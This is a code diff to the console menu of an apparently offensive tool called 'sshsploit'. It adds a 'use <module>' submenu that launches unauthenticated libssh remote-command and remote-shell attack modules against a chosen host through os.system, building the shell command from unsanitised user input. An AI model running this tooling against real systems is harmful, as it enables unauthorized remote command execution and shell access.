@@ -37,6 +37,8 @@ rhost = ""
 rport = ""
 cmd = ""
 
+attack = ""
+
 readline.parse_and_bind("tab: complete")
 
 def banner():
@@ -54,7 +56,6 @@ def main():
         if ui == []:
             pass
         elif ui[0] == "exit":
-            os.system("chmod +x core/server.sh && core/server.sh stop")
             sys.exit()
         elif ui[0] == "clear":
             os.system("clear")
@@ -66,29 +67,50 @@ def main():
             print("=============")
             os.system("cat data/cmds/core_cmds.txt")
             print("")
-        elif ui[1] == "set":
-            if len(ui) < 3:
-                print("Usage: set <option> <value>")
-            else:
-                pass
-        elif ui[0] == "run":
+        elif ui[0] == "use":
             if len(ui) < 2:
-                print("Usage: run <attack>")
+                print("Usage: use <module>")
             else:
-                if rhost == "" or rport == "":
-                    print(E+"Target is not specified!")
-                else:
-                    if ui[1] == "libssh_rce_noauth":
-                        if cmd == "":
-                            print(E+"Command for RCE is not specified!")
+                attack = ui[1]
+                if attack == "libssh_rce_noauth" or attack == "libssh_shell_noauth":
+                    mod = input('\033[4msshsploit\033[0m(\033[1;31m'+attack+'\033[0m)> ').strip(" ")
+                    mod = mod.split()
+                    while True:
+                        if mod[0] == "run":
+                            if rhost == "" or rport == "":
+                                print(E+"Target is not specified!")
+                            else:
+                                if attack == "libssh_rce_noauth":
+                                    if cmd == "":
+                                        print(E+"Command for RCE is not specified!")
+                                    else:
+                                        print(G+"Starting libssh_rce_noauth attack...")
+                                        os.system("python3 modules/libssh_rce_noauth.py "+rhost+" -p "+rport+" -v '"+cmd+"'")
+                                elif attack == "libssh_shell_noauth":
+                                    print(G+"Starting libssh_shell_noauth attack...")
+                                    os.system("python3 modules/libssh_shell_noauth.py "+rhost+" -p "+rport+" -v --shell")
+                        elif mod[0] == "clear":
+                            os.system("clear")
+                        elif mod[0] == "exit":
+                            sys.exit()
+                        elif mod[0] == "update":
+                            os.system("chmod +x etc/update.sh && etc/update.sh")
+                        elif mod[0] == "help":
+                            print("")
+                            print("Core Commands")
+                            print("=============")
+                            os.system("cat data/cmds/core_cmds.txt")
+                            print("")
+                            print("Module Commands")
+                            print("===============")
+                            os.system("cat data/cmds/module_cmds.txt")
+                            print("")
                         else:
-                            print(G+"Starting libssh_rce_noauth attack...")
-                            os.system("python3 modules/libssh_rce_noauth.py "+rhost+" -p "+rport+" -v '"+cmd+"'")
-                    elif ui[1] == "libssh_shell_noauth":
-                            print(G+"Starting libssh_shell_noauth attack...")
-                            os.system("python3 modules/libssh_shell_noauth.py "+rhost+" -p "+rport+" -v --shell")
-                    else:
-                        print(E+"No such attack!")
+                            print(E+"Unrecognized command!")
+                        mod = input('\033[4msshsploit\033[0m(\033[1;31m'+attack+'\033[0m)> ').strip(" ")
+                        mod = mod.split()
+                else:
+                    print(E+"No such module!")
         else:
             print(E+"Unrecognized command!")
         ui = input('\033[4msshsploit\033[0m> ').strip(" ")
